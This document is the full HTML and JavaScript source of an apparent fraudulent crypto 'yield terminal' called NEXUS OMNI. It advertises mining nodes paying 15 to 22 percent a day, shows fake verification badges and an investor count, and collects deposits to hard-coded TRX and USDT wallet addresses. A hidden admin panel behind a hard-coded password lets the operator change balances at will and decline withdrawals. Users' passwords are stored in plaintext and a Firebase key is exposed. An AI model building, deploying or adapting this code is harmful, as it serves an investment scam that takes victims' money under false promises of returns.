<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS OMNI | Institutional Yield Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        :root { --n-blue: #2563eb; --n-dark: #0f172a; }
        body { background: #f8fafc; color: #1e293b; font-family: 'Plus Jakarta Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
        
        /* Typography & Visibility Fixes */
        .input-prime { background: #ffffff !important; color: #0f172a !important; border: 2px solid #e2e8f0 !important; border-radius: 20px; padding: 18px; width: 100%; font-weight: 700; outline: none; }
        .input-prime:focus { border-color: var(--n-blue) !important; }
        
        /* Modern Node Cards */
        .node-card { background: #fff; border-radius: 32px; overflow: hidden; display: flex; height: 145px; box-shadow: 0 15px 35px -10px rgba(0,0,0,0.05); margin-bottom: 20px; border: 1px solid #f1f5f9; transition: 0.3s; }
        .node-img { width: 135px; height: 145px; object-fit: cover; }
        .node-info { padding: 15px 20px; flex: 1; display: flex; flex-direction: column; justify-content: center; }

        /* Trust Badges */
        .verified-badge { background: #dcfce7; color: #166534; padding: 4px 10px; border-radius: 10px; font-size: 8px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
        
        .glass-card { background: #ffffff; border-radius: 35px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.06); }
        .btn-prime { background: var(--n-dark); color: #fff; border-radius: 22px; font-weight: 800; padding: 18px; width: 100%; text-transform: uppercase; font-size: 11px; letter-spacing: 2px; box-shadow: 0 10px 20px -5px rgba(15, 23, 42, 0.3); }
        
        .nav-link { color: #94a3b8; font-size: 10px; font-weight: 800; text-align: center; flex: 1; transition: 0.3s; }
        .nav-link.active { color: var(--n-blue); transform: translateY(-3px); }
        
        #preloader { position: fixed; inset: 0; background: #fff; z-index: 50000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .legal-modal { display: none; position: fixed; inset: 0; background: white; z-index: 20000; overflow-y: auto; padding: 35px; }
    </style>
</head>
<body>

    <div id="preloader">
        <div class="w-14 h-14 border-4 border-slate-100 border-t-blue-600 rounded-full animate-spin"></div>
        <p class="mt-6 text-[10px] font-black uppercase tracking-[5px] text-slate-400">Syncing Data...</p>
    </div>

    <div id="auth-view" class="min-h-screen flex items-center justify-center p-8 bg-slate-50">
        <div class="max-w-md w-full space-y-10">
            <div class="text-center">
                <h1 class="text-6xl font-black italic tracking-tighter text-slate-900">NEXUS<span class="text-blue-600">.</span></h1>
                <p class="text-[9px] font-black text-slate-400 uppercase tracking-[10px] mt-2">Institutional Terminal</p>
            </div>
            <div id="login-box" class="glass-card p-10 space-y-6">
                <input type="text" id="l-user" placeholder="Account ID" class="input-prime">
                <input type="password" id="l-pass" placeholder="Security PIN" class="input-prime">
                <button onclick="login()" class="btn-prime">Verify & Access</button>
                <p class="text-center text-[10px] font-black text-slate-500 uppercase">Need access? <span onclick="toggleAuth(true)" class="text-blue-600 cursor-pointer underline">Register</span></p>
            </div>
            <div id="signup-box" class="glass-card p-10 space-y-6 hidden">
                <input type="text" id="s-user" placeholder="Choose Account ID" class="input-prime">
                <input type="password" id="s-pass" placeholder="Set Security PIN" class="input-prime">
                <button onclick="signup()" class="btn-prime">Initialize Vault</button>
                <p class="text-center text-[10px] font-black text-slate-500 uppercase">Existing? <span onclick="toggleAuth(false)" class="text-blue-600 cursor-pointer underline">Login</span></p>
            </div>
        </div>
    </div>

    <div id="main-view" class="hidden pb-44">
        <header class="p-6 sticky top-0 z-50 bg-white/90 backdrop-blur-2xl border-b border-slate-50 flex justify-between items-center">
            <div class="flex items-center gap-4">
                <div id="logo-trigger" class="w-14 h-14 bg-slate-900 text-white rounded-[22px] flex items-center justify-center text-2xl font-black shadow-lg">N</div>
                <div>
                    <p id="display-name" class="text-sm font-black text-slate-900 uppercase">---</p>
                    <div class="verified-badge mt-1"><i class="fa-solid fa-check-double mr-1"></i>Verified Tier</div>
                </div>
            </div>
            <button onclick="logout()" class="w-12 h-12 rounded-2xl bg-slate-50 text-slate-400 flex items-center justify-center text-lg"><i class="fa-solid fa-power-off"></i></button>
        </header>

        <main id="tab-home" class="p-6 space-y-8">
            <div class="glass-card p-10 bg-slate-900 text-white relative overflow-hidden">
                <div class="relative z-10">
                    <p class="text-[10px] font-bold text-slate-400 uppercase tracking-[4px]">Total Portfolio</p>
                    <h2 id="ui-bal" class="text-5xl font-black mt-3 text-white tracking-tighter">$0.00</h2>
                    <div class="mt-10 flex justify-between items-center border-t border-white/10 pt-8">
                        <div>
                            <p class="text-[9px] font-bold text-slate-500 uppercase">Daily Yield</p>
                            <p id="ui-prof" class="text-3xl font-black text-emerald-400">+$0.00</p>
                        </div>
                        <button onclick="nav('bank')" class="bg-blue-600 text-white px-8 py-3 rounded-2xl text-[10px] font-black uppercase tracking-widest shadow-lg shadow-blue-500/20">Action Hub</button>
                    </div>
                </div>
                <div class="absolute -right-10 -bottom-10 w-40 h-40 bg-blue-600 rounded-full blur-[80px] opacity-20"></div>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <button onclick="showLegal('about')" class="bg-white p-5 rounded-3xl text-[10px] font-black uppercase text-slate-500 border border-slate-50 shadow-sm">About Nexus</button>
                <button onclick="showLegal('faq')" class="bg-white p-5 rounded-3xl text-[10px] font-black uppercase text-slate-500 border border-slate-50 shadow-sm">Help Desk</button>
            </div>

            <h3 class="text-[11px] font-black text-slate-400 uppercase tracking-[6px] ml-2">Deployed Infrastructure</h3>
            <div id="active-list" class="space-y-4"></div>
        </main>

        <main id="tab-nodes" class="p-6 hidden">
            <h3 class="text-sm font-black uppercase border-l-4 border-blue-600 pl-4 mb-8">Premium Hardware (5)</h3>
            <div id="elite-box" class="space-y-4 mb-12"></div>
            <h3 class="text-sm font-black uppercase border-l-4 border-slate-300 pl-4 mb-8">Standard Nodes (15)</h3>
            <div id="retail-box" class="space-y-4"></div>
        </main>

        <main id="tab-bank" class="p-6 space-y-8 hidden">
            <div class="glass-card p-8 space-y-6">
                <h3 class="text-xs font-black uppercase text-blue-600 tracking-widest">Deposit Hub</h3>
                <select id="d-asset" class="input-prime font-bold" onchange="updAddr()">
                    <option value="">Select Asset Protocol</option>
                    <option value="TRX">TRX (TRC20)</option>
                    <option value="USDT">USDT (TRC20)</option>
                </select>
                <div id="d-panel" class="hidden space-y-6">
                    <p id="addr-txt" class="text-[11px] font-mono font-black text-blue-600 p-5 bg-slate-50 rounded-2xl break-all text-center"></p>
                    <input type="number" id="d-amt" placeholder="Deposit Amount ($)" class="input-prime">
                    <input type="text" id="d-tid" placeholder="Tx Hash ID" class="input-prime">
                    <input type="file" id="d-img" class="text-[10px] font-bold">
                    <button onclick="sendD()" class="btn-prime">Submit for Audit</button>
                </div>
            </div>

            <div class="glass-card p-8 space-y-6 border-t-8 border-slate-900">
                <h3 class="text-xs font-black uppercase text-slate-400 tracking-widest">Payout Gateway</h3>
                <select id="w-method" class="input-prime font-bold">
                    <option value="">Select Withdrawal Method</option>
                    <option value="Binance">Binance Terminal</option>
                    <option value="OKX">OKX Exchange</option>
                    <option value="TrustWallet">Trust Wallet</option>
                    <option value="MetaMask">MetaMask (Web3)</option>
                    <option value="Coinbase">Coinbase</option>
                    <option value="ByBit">ByBit Pro</option>
                    <option value="Bank">Direct Swift Wire</option>
                </select>
                <input type="number" id="w-amt" placeholder="Withdrawal Amount ($)" class="input-prime">
                <input type="text" id="w-name" placeholder="Full Account Name" class="input-prime">
                <input type="text" id="w-acc" placeholder="Wallet Address / IBAN Number" class="input-prime">
                <button onclick="sendW()" class="btn-prime !bg-blue-600">Finalize Request</button>
            </div>
        </main>

        <main id="tab-ledger" class="p-6 hidden">
            <h3 class="text-xs font-black uppercase tracking-widest text-slate-400 mb-8 text-center">Transaction Ledger</h3>
            <div id="ledger-box" class="space-y-4"></div>
        </main>

        <nav class="fixed bottom-10 left-8 right-8 h-24 glass-card shadow-2xl flex justify-around items-center px-4 z-[1000] border border-slate-100">
            <div onclick="nav('home')" class="nav-link active"><i class="fa-solid fa-home-lg-alt text-2xl mb-1"></i><br>HOME</div>
            <div onclick="nav('nodes')" class="nav-link"><i class="fa-solid fa-microchip text-2xl mb-1"></i><br>NODES</div>
            <div onclick="nav('bank')" class="nav-link"><i class="fa-solid fa-wallet text-2xl mb-1"></i><br>BANK</div>
            <div onclick="nav('ledger')" class="nav-link"><i class="fa-solid fa-history text-2xl mb-1"></i><br>LEDGER</div>
        </nav>
    </div>

    <div id="adm-panel" class="fixed inset-0 bg-white z-[10001] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10 pb-6 border-b">
            <h2 class="text-xl font-black italic uppercase text-blue-600">Omni Terminal</h2>
            <button onclick="document.getElementById('adm-panel').classList.add('hidden')" class="text-4xl">&times;</button>
        </div>
        <div id="adm-users" class="space-y-4 mb-10"></div>
        <div id="adm-requests" class="space-y-6"></div>
    </div>

    <div id="legal-modal" class="legal-modal">
        <button onclick="closeLegal()" class="text-4xl float-right">&times;</button>
        <h2 id="legal-h" class="text-3xl font-black uppercase mt-12 mb-8"></h2>
        <div id="legal-body" class="text-sm text-slate-500 space-y-6 leading-relaxed"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const config = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(config);
        const db = getDatabase(app);

        // 15+5 Node Data System
        const nodeData = {
            elite: [
                { id: 'e1', name: "Omni Sovereign", price: 10000, daily: 1500, img: "https://images.unsplash.com/photo-1518770660439-4636190af475?w=400" },
                { id: 'e2', name: "Apex Titan", price: 25000, daily: 4000, img: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=400" },
                { id: 'e3', name: "Global Core", price: 50000, daily: 9000, img: "https://images.unsplash.com/photo-1644144979624-912869062324?w=400" },
                { id: 'e4', name: "Quantum Protocol", price: 100000, daily: 20000, img: "https://images.unsplash.com/photo-1642104704074-907c0698cbd9?w=400" },
                { id: 'e5', name: "Sovereign Prime", price: 250000, daily: 55000, img: "https://images.unsplash.com/photo-1614850523296-d8c1af93d400?w=400" }
            ],
            retail: Array.from({length: 15}, (_, i) => ({
                id: `r${i}`, name: `Nexus Node v.${i+1}`, price: 100 + (i*150), daily: 12 + (i*14), img: `https://images.unsplash.com/photo-1558494949-ef010cbdcc51?w=300&sig=${i}`
            }))
        };

        window.onload = () => {
            renderNodes();
            setTimeout(() => document.getElementById('preloader').style.display='none', 800);
            const user = localStorage.getItem('nx_usr');
            if(user) startSession(user);
        };

        // --- AUTH ---
        window.login = async () => {
            const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value;
            const s = await get(ref(db, `users/${u}`));
            if(s.exists() && s.val().password === p) { localStorage.setItem('nx_usr', u); startSession(u); } else alert("Verification Failed.");
        };

        window.signup = async () => {
            const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value;
            if(u && p) { await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0, banned: false }); toggleAuth(false); }
        };

        function startSession(uid) {
            document.getElementById('auth-view').classList.add('hidden');
            document.getElementById('main-view').classList.remove('hidden');
            document.getElementById('display-name').innerText = uid;
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                if(d.banned) { logout(); return; }
                document.getElementById('ui-bal').innerText = '$' + (d.balance || 0).toLocaleString();
                document.getElementById('ui-prof').innerText = '+$' + (d.profit || 0).toLocaleString();
                const active = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-list').innerHTML = active.map(([k, v]) => `
                    <div class="glass-card p-8 flex justify-between items-center border-l-8 border-blue-600">
                        <div><p class="text-[11px] font-black uppercase text-slate-800">${v.name}</p><p class="text-[8px] font-bold text-slate-400 mt-1 uppercase">Protocol Active</p></div>
                        <span class="text-[10px] font-black text-blue-600">DEPLOYED</span>
                    </div>`).join('') || '<p class="text-center py-10 text-slate-300 font-black uppercase text-[9px]">No protocols online</p>';
                const hist = d.history ? Object.entries(d.history).reverse() : [];
                document.getElementById('ledger-box').innerHTML = hist.map(([k, h]) => `
                    <div class="bg-white p-6 rounded-3xl flex justify-between items-center shadow-sm">
                        <div><p class="text-[10px] font-black uppercase">${h.type}</p><p class="text-[8px] font-bold text-slate-400">${h.date}</p></div>
                        <div class="text-right"><p class="text-xs font-black">$${h.amount}</p><p class="text-[8px] font-black uppercase ${h.status === 'Cleared' ? 'text-emerald-500' : 'text-amber-500'}">${h.status}</p></div>
                    </div>`).join('');
            });
        }

        // --- ADMIN ---
        let taps = 0; document.getElementById('logo-trigger').onclick = () => {
            taps++; if(taps === 4) { if(prompt("Pass:") === "coin786") { document.getElementById('adm-panel').classList.remove('hidden'); runAdm(); } taps = 0; }
        };

        function runAdm() {
            onValue(ref(db, 'users'), (s) => {
                const u = s.val();
                document.getElementById('adm-users').innerHTML = u ? Object.entries(u).map(([id, d]) => `
                    <div class="bg-slate-50 p-6 rounded-3xl space-y-4">
                        <p class="font-black text-xs uppercase text-slate-900">${id} (${d.password})</p>
                        <div class="flex gap-2">
                            <button onclick="modBal('${id}','add')" class="bg-emerald-600 text-white text-[8px] font-black px-4 py-2 rounded-xl">ADD $</button>
                            <button onclick="modBal('${id}','rem')" class="bg-rose-600 text-white text-[8px] font-black px-4 py-2 rounded-xl">SUB $</button>
                            <button onclick="toggleBan('${id}', ${d.banned})" class="bg-black text-white text-[8px] font-black px-4 py-2 rounded-xl">BAN</button>
                        </div>
                    </div>`).join('') : '';
            });
            onValue(ref(db, 'admin/requests'), (s) => {
                const d = s.val();
                document.getElementById('adm-requests').innerHTML = d ? Object.values(d).map(r => `
                    <div class="glass-card p-6 border space-y-4">
                        <p class="text-[10px] font-black uppercase">${r.type} | ${r.user} | $${r.amount}</p>
                        <p class="text-[9px] text-slate-500">${r.method}<br>${r.accDetails || ''}</p>
                        ${r.proof ? `<img src="${r.proof}" class="w-full h-40 object-cover rounded-2xl">` : ''}
                        <div class="flex gap-3">
                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Cleared','${r.type}')" class="bg-emerald-600 text-white py-3 rounded-2xl flex-1 font-black text-[9px]">APPROVE</button>
                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Declined','${r.type}')" class="bg-rose-600 text-white py-3 rounded-2xl flex-1 font-black text-[9px]">REJECT</button>
                        </div>
                    </div>`).join('') : '';
            });
        }

        window.modBal = async (uid, type) => {
            const val = prompt("Amount:"); if(!val) return;
            const s = await get(ref(db, `users/${uid}`));
            const cur = s.val().balance || 0;
            await update(ref(db, `users/${uid}`), { balance: type === 'add' ? cur + parseFloat(val) : cur - parseFloat(val) });
        };
        window.toggleBan = async (uid, cur) => await update(ref(db, `users/${uid}`), { banned: !cur });
        window.audit = async (id, user, amt, status, type) => {
            if(status === 'Cleared' && type === 'Deposit') {
                const s = await get(ref(db, `users/${user}`));
                await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
            }
            if(status === 'Declined' && type === 'Withdrawal') {
                const s = await get(ref(db, `users/${user}`));
                await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
            }
            await update(ref(db, `users/${user}/history/${id}`), { status });
            await remove(ref(db, 'admin/requests/' + id));
        };

        // --- CORE UI ---
        function renderNodes() {
            const ui = (n) => `
                <div class="node-card">
                    <img src="${n.img}" class="node-img">
                    <div class="node-info">
                        <h4 class="text-[11px] font-black uppercase text-slate-800">${n.name}</h4>
                        <p class="text-[10px] font-bold text-emerald-600 mt-1">Daily: $${n.daily}</p>
                        <div class="flex justify-between items-center mt-3">
                            <span class="text-xl font-black text-slate-900">$${n.price}</span>
                            <button onclick="buyNode('${n.id}', ${n.price}, '${n.name}')" class="bg-blue-600 text-white text-[9px] font-black px-4 py-2.5 rounded-xl">DEPLOY</button>
                        </div>
                    </div>
                </div>`;
            document.getElementById('elite-box').innerHTML = nodeData.elite.map(ui).join('');
            document.getElementById('retail-box').innerHTML = nodeData.retail.map(ui).join('');
        }

        window.buyNode = async (id, price, name) => {
            const uid = localStorage.getItem('nx_usr'), s = await get(ref(db, `users/${uid}`));
            if(s.val().balance < price) return alert("Insufficient Balance");
            await update(ref(db, `users/${uid}`), { balance: s.val().balance - price });
            await push(ref(db, `users/${uid}/nodes`), { name, deployedAt: Date.now() });
            alert("Node Deployed!"); nav('home');
        };

        const legals = {
            about: "<b>Global HQ:</b> 702 Main Street, Woodland, California, USA.<br><br>Nexus Omni provides institutional mining solutions via distributed data centers worldwide. Trusted by over 40k investors.",
            faq: "<b>Payouts:</b> Audited within 1-4 hours.<br><b>Uptime:</b> Hardware nodes run 24/7/365."
        };
        window.showLegal = (t) => { document.getElementById('legal-h').innerText = t.toUpperCase(); document.getElementById('legal-body').innerHTML = legals[t]; document.getElementById('legal-modal').style.display = 'block'; };
        window.closeLegal = () => document.getElementById('legal-modal').style.display = 'none';
        window.nav = (p) => { ['home','nodes','bank','ledger'].forEach(x => document.getElementById('tab-'+x).classList.add('hidden')); document.getElementById('tab-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-link').forEach(i => i.classList.remove('active')); event.currentTarget.classList.add('active'); };
        window.updAddr = () => { const m = document.getElementById('d-asset').value, map = { "TRX": "TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76", "USDT": "TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ" }; document.getElementById('addr-txt').innerText = map[m] || ""; document.getElementById('d-panel').classList.toggle('hidden', !m); };
        window.sendD = () => { const f = document.getElementById('d-img').files[0]; if(!f) return; const reader = new FileReader(); reader.readAsDataURL(f); reader.onload = async () => { const uid = localStorage.getItem('nx_usr'), key = push(ref(db, 'admin/requests')).key; const req = { id: key, user: uid, amount: document.getElementById('d-amt').value, proof: reader.result, status: 'Pending', type: 'Deposit', date: new Date().toLocaleString() }; await set(ref(db, `admin/requests/${key}`), req); await set(ref(db, `users/${uid}/history/${key}`), req); alert("Audit Started"); nav('ledger'); }; };
        window.sendW = async () => { const uid = localStorage.getItem('nx_usr'), amt = parseFloat(document.getElementById('w-amt').value), method = document.getElementById('w-method').value, name = document.getElementById('w-name').value, acc = document.getElementById('w-acc').value; if(!amt || !method || !acc) return alert("Fill all fields"); const s = await get(ref(db, `users/${uid}`)); if(s.val().balance < amt) return alert("Insufficient Capital"); await update(ref(db, `users/${uid}`), { balance: s.val().balance - amt }); const key = push(ref(db, 'admin/requests')).key; const req = { id: key, user: uid, amount: amt, method, accName: name, accDetails: acc, status: 'Pending', type: 'Withdrawal', date: new Date().toLocaleString() }; await set(ref(db, `admin/requests/${key}`), req); await set(ref(db, `users/${uid}/history/${key}`), req); alert("Withdrawal Sent"); nav('ledger'); };
        window.toggleAuth = (s) => { document.getElementById('login-box').classList.toggle('hidden', s); document.getElementById('signup-box').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
    </script>
</body>
</html>
